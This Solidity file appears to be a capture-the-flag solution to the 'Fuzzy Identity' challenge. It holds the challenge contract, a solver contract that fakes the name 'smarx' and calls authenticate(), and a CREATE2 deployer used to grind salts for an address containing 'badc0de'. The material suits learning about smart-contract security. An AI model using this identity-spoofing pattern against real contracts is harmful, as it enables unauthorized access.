pragma solidity ^0.8.0;

import "hardhat/console.sol";
interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}

contract FuzzySolver is IName {
    function name() external view override returns (bytes32) {
        return bytes32('smarx');
    }

    function exploit(address _addr) public {
        FuzzyIdentityChallenge fic = FuzzyIdentityChallenge(_addr);
        fic.authenticate();
    }
}

contract Deployer {
    event AddressReturn(address indexed _addr);
    bytes contractBytecode;
    constructor (bytes memory _contractBytecode) {
        contractBytecode = _contractBytecode;
    }

    // bytes contractBytecode = bytes("0x608060405234801561001057600080fd5b506101f7806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780630aeb4ddf14610059575b600080fd5b610043610075565b6040516100509190610153565b60405180910390f35b610073600480360381019061006e919061011b565b61009d565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b505050505050565b600081359050610115816101aa565b92915050565b60006020828403121561012d57600080fd5b600061013b84828501610106565b91505092915050565b61014d81610180565b82525050565b60006020820190506101686000830184610144565b92915050565b60006101798261018a565b9050919050565b6000819050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101b38161016e565b81146101be57600080fd5b5056fea26469706673582212203ede4dbc41e3323a59171c09a02bf8d5f465f5e35965c743efb73b048e6d6b8d64736f6c63430008000033");

    function deployContract(bytes32 salt) public {
        bytes memory bytecode = contractBytecode;
        address addr;
        
        assembly {
        addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }

        console.log('Solidity Logger');
        console.log(addr);

        emit AddressReturn(addr);
    }
}